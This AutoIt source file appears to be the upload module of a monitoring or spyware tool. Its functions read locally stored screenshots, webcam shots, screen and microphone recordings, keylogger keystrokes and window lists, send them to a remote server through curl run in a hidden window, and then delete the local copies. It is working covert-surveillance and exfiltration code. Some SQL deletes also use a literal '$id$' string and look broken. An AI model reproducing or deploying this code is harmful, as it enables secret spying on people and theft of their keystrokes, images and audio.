
Func moveErrors()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM application_errors ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $module=$aRow[1]
		
		Local $company_id=$aRow[2]
		
		Local $error=$aRow[3]
		
		Local $computer_serial=$aRow[4]
		
		Local $address=$serverAddress&"/putError/computer_serial/"&$computer_serial&"/company_id/"&$company_id&"/module/"&$module&"/error/"&$error
	
		Local $parameter='curl -v '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		Local $result=$sOutput
		
		ConsoleWrite($result)
		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			_SQLite_Exec($databaseHandle, "DELETE FROM application_errors WHERE id='$id$'")
			
		EndIf	
			
	
	WEnd
        
	sqliteStop()

EndFunc



Func moveScreenShots()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM screen_shots ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $info=($computer_serial&","&$epoch&","&$filename)
		
		Local $address=$serverAddress&"/putScreenShot"
	
		Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		ConsoleWrite($sOutput)
	
		Local $result=$sOutput

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM screen_shots WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()

EndFunc



Func moveCameraShots()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM camera_shots ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putCameraShot"
		
		Local $info=($computer_serial&","&$epoch&","&$filename)
	
		Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		ConsoleWrite($sOutput)
	
		Local $result=$sOutput

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM camera_shots WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc




Func moveScreenRecordings()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM screen_recordings ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putScreenRecording"
		
		Local $info=($computer_serial&","&$epoch&","&$filename)
	
		Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		ConsoleWrite($sOutput)
	
		Local $result=$sOutput

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM screen_recordings WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()


	
EndFunc



Func moveMicrophoneRecordings()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM microphone_recordings ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $filePath=$aRow[1]
		
		Local $filename=$filePath
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putMicrophoneRecording"
		
		Local $info=($computer_serial&","&$epoch&","&$filename)
	
		Local $parameter='curl -v -F '& '"info='&$info&'"' & ' -F ' &  '"file=@'&$filePath&'" '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		ConsoleWrite($sOutput)
	
		Local $result=$sOutput

		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			if _SQLite_Exec($databaseHandle, "DELETE FROM microphone_recordings WHERE id='$id$'")== $SQLITE_OK Then
				
				if FileExists($filePath) Then
		
					FileDelete ($filePath)
					
				EndIf
				
			EndIf
		
			
		EndIf
			
			
	
	WEnd
        
	sqliteStop()

EndFunc


Func moveKeys()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM keylogger ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $keys=$aRow[1]
		
		Local $computer_serial=$aRow[2]
		
		Local $epoch=$aRow[3]
		
		Local $address=$serverAddress&"/putKeys"
		
		Local $parameter='curl -v  -X POST -F '& '"computer_serial='&$computer_serial&'"' & ' -F ' &  '"keys='&$keys&'"' &' -F '& '"epoch='&$epoch&'"  '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		Local $result=$sOutput
		
		ConsoleWrite($result)
		
		;MsgBox(64,"",$parameter)
		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			_SQLite_Exec($databaseHandle, "DELETE FROM keylogger WHERE id='$id$'")
			
		EndIf	
			
	
	WEnd
        
	sqliteStop()

EndFunc


Func moveWindows()
	
	sqliteStart()
	
	Local $hQuery,$aRow
	
	_SQLite_Query($databaseHandle, "SELECT * FROM windows ORDER BY id DESC ", $hQuery)
	
	While _SQLite_FetchData($hQuery, $aRow, False, False) = $SQLITE_OK
		
		Local $id=$aRow[0]
		
		Local $window=$aRow[1]
		
		Local $exists=$aRow[2]
		
		Local $visable=$aRow[3]
		
		Local $enabled=$aRow[4]
		
		Local $active=$aRow[5]
		
		Local $maximized=$aRow[6]
		
		Local $minimized=$aRow[7]
		
		Local $process=$aRow[8]
		
		Local $computer_serial=$aRow[9]
		
		Local $epoch=$aRow[10]
		
		Local $address=$serverAddress&"/putWindows"
		
		Local $parameter='curl -v  -X POST -F '& '"computer_serial='&$computer_serial&'"' & ' -F ' &  '"window='&$window&'"' &' -F '& '"epoch='&$epoch&'"'&' -F '&'"exists='&$exists&'"'&' -F '&'"visible='&$visable&'"'&' -F '&'"enabled='&$enabled&'"'&' -F '&'"active='&$active&'"'&' -F '&'"maximised='&$maximized&'"'&' -F '&'"minimised='&$minimized&'"'&' -F '&'"process='&$process&'"  '&$address
	
		Local $iPID = Run(@WorkingDir&'\lib\bin\curl\bin\curl.exe  '&$parameter, '', @SW_HIDE,BitOR($STDERR_CHILD, $STDOUT_CHILD))
	
		Local $sOutput = ""
	
		While 1
		
			$sOutput &= StdoutRead($iPID)
		
			If @error Then 
			
				ExitLoop
			
			EndIf
		
		WEnd
	
		Local $result=$sOutput
		
		ConsoleWrite($result)
		
		;MsgBox(64,"",$parameter)
		
		if $result<>"ok" Then
			
			;transferring values to remote did not work do nothing
			
		Else
			
			;values transferred to remote now delete entry from local db
			
			_SQLite_Exec($databaseHandle, "DELETE FROM windows WHERE id='$id$'")
			
		EndIf	
			
	
	WEnd
        
	sqliteStop()

EndFunc



